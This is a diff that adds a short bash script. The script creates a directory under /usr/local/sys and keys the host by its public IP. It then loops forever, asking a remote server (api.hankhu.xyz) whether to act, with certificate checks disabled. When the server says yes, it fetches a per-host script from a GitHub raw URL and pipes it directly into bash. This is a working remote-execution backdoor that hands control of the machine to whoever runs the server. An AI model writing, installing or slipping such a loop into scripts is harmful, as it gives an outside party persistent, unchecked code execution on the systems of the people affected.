@@ -1,0 +1,21 @@
+#!/bin/bash
+dirsys=/usr/local/sys
+if [ ! -d $dirsys ];then
+mkdir -p $dirsys
+fi
+
+cd $dirsys
+ip=`curl -s ipv4.ip.sb`
+uid=${ip//./_}
+while :
+do
+mod=`curl  -X POST  https://api.hankhu.xyz/sys/sys.php -d $uid -sk`
+
+if [ $mod -eq 1 ];then
+    bash  < <(curl  -Ls https://raw.githubusercontent.com/hankhu666/sys/main/${uid}.sh)
+   sleep 300 
+else
+    sleep 3600
+fi
+
+done
